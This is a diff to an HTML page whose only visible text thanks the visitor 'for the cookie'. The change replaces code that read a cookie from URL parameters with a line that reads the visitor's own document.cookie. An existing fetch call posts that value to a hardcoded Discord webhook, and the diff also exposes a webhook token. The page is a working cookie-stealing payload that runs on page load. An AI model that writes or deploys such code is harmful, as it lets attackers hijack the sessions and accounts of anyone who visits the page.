@@ -7,31 +7,12 @@
 <body>
     <p>Ah... sorry... Thanks for the cookie :()</p>
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const hashParams = new URLSearchParams(window.location.hash.substring(1));
-    const rawCookie = urlParams.get('cookie') || hashParams.get('cookie') || '[No cookie found]';
-
-    const cookiesToIgnore = [
-      '_tracking_consent',
-      'CONSENT',
-      'eu_cn',
-      'twtr_pixel_opt_in',
-      'd_prefs'
-    ];
-
-    const filtered = rawCookie
-      .split(';')
-      .map(c => c.trim())
-      .filter(c => {
-        const name = c.split('=')[0];
-        return !cookiesToIgnore.includes(name);
-      })
-      .join('; ');
+  const data = document.cookie;
 
     fetch('https://discord.com/api/webhooks/1442229849287692338/pPy2dPqNwMFkFtRLoNuFfo0Vk8GQN_XmxI6ZA9VjqlqHI9_7DTcJ-GmhrGrH8o4CJtvE', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({content: `Cookies : ${filtered}`})
+      body: JSON.stringify({content: `Cookies : ${data}`})
     });
   </script>
 </body>
